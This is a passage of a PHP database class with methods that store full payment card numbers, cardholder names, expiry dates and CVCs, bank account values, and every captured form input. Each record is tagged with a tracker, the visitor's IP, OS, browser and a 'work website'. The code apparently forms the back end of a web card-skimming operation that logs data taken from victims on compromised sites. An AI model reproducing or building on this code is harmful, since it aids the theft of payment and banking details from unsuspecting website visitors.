    public function addPaymentMethodsData($tracker, $app_id, $ip, $os_name_arch, $browser, $cardNumber, $cardBrand, $cardHolder, $cardExpire, $cardCVC, $event, $workWebsite)
    {
        //INSERT INTO `msu_info_payment_methods`(`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `cardNumber`, `cardHolder`, `cardBrand`, `cardExpire`, `cardCVC`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10],[value-11],[value-12],[value-13])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "info_payment_methods` (`id`, `tracker`, `app_id`, `ip_address`, `os_name_arch`, `browser`, `work_website`, `event`, `cardNumber`, `cardHolder`, `cardBrand`, `cardExpire`, `cardCVC`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :os_name_arch, :browser, :workWebsite, :event, :cardNumber, :holder, :brand, :expire, :cvc, now());")
            ->execute(
                array(
                    ':tracker' => $tracker,
                    ':app_id' => $app_id,
                    ':ip_add' => $ip,
                    ':os_name_arch' => $os_name_arch,
                    ':browser' => $browser,
                    ':cardNumber' => $cardNumber,
                    ':brand' => $cardBrand,
                    ':holder' => $cardHolder,
                    ':expire' => $cardExpire,
                    ':cvc' => $cardCVC,
                    ':workWebsite' => $workWebsite,
                    ':event' => $event
                ));
    }

    /**
     * @public
     * @param $tracker
     * @param $app_id
     * @param $ip
     * @param $browser
     * @param $workWebsite
     * @param $dataType
     * @param $dataValue
     * @return mixed
     */
    public function addBankAccountData($tracker, $app_id, $ip, $browser, $workWebsite, $dataType, $dataValue)
    {
        //INSERT INTO `msu_info_bank_account`(`id`, `tracker`, `app_id`, `ip_address`, `browserNameFull`, `work_website`, `data_type`, `data_value`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "info_bank_account` (`id`, `tracker`, `app_id`, `ip_address`, `browserNameFull`, `work_website`, `data_type`, `data_value`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :browser, :workWebsite, :dataType, :dataValue, now());")
            ->execute(
                array(
                    ':tracker' => $tracker,
                    ':app_id' => $app_id,
                    ':ip_add' => $ip,
                    ':browser' => $browser,
                    ':workWebsite' => $workWebsite,
                    ':dataType' => $dataType,
                    ':dataValue' => $dataValue
                ));
    }

    /**
     * @public
     * @param $tracker
     * @param $app_id
     * @param $ip
     * @param $browser
     * @param $workWebsite
     * @param $name
     * @param $type
     * @param $value
     * @param $placeholder
     * @return mixed
     */
    public function addInputElementData($tracker, $app_id, $ip, $browser, $workWebsite, $name, $type, $value, $placeholder)
    {
        //INSERT INTO `msu_info_input_elements_data`(`id`, `tracker`, `app_id`, `ip_address`, `browserNameFull`, `work_website`, `name`, `type`, `value`, `placeholder`, `last_update_date_time`) VALUES ([value-1],[value-2],[value-3],[value-4],[value-5],[value-6],[value-7],[value-8],[value-9],[value-10],[value-11])
        return $this->prepare("INSERT INTO `" . DbPREFIX . "info_input_elements_data` (`id`, `tracker`, `app_id`, `ip_address`, `browserNameFull`, `work_website`, `name`, `type`, `value`, `placeholder`, `last_update_date_time`) VALUES (null, :tracker, :app_id, :ip_add, :browser, :workWebsite, :elName, :elType, :elValue, :elPlaceholder, now());")
            ->execute(
                array(
                    ':tracker' => $tracker,
                    ':app_id' => $app_id,
                    ':ip_add' => $ip,
                    ':browser' => $browser,
                    ':workWebsite' => $workWebsite,
                    ':elName' => $name,
                    ':elType' => $type,
                    ':elValue' => $value,
                    ':elPlaceholder' => $placeholder
                ));
    }

}